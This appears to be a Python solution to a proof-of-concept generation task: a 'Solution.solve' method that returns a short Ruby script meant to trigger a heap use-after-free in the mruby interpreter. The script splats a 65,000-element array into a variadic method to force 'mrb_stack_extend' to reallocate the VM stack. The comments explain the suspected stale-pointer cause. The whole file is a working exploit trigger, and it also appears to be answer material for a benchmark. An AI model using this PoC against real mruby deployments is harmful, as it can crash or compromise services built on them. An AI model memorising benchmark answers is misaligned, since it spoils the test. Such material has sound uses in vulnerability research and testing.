import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in mruby.
        
        The vulnerability is caused by a stale pointer to the VM stack (regs) being used 
        after the stack has been reallocated by mrb_stack_extend(). This typically occurs 
        during argument preparation for a method call involving a large splat (*), 
        which forces the stack to grow.
        """
        
        # We construct a Ruby script that:
        # 1. Defines a target method 't' that accepts variable arguments.
        # 2. Defines a trigger method 'run' that creates a large array (65000 elements).
        # 3. Calls 't' using the splat operator on the large array.
        #    This forces the VM to push 65000 elements onto the stack, triggering mrb_stack_extend.
        #    If the VM implementation of OP_SEND or related logic caches a pointer to the 
        #    old stack (e.g., the receiver 'self') and uses it after extension, a UAF occurs.
        
        poc_source = (
            b"class UAF\n"
            b"def t(*a);end\n"
            b"def run\n"
            b"a=Array.new(65000,1)\n"
            b"t(*a)\n"
            b"end\n"
            b"end\n"
            b"UAF.new.run\n"
        )
        
        return poc_source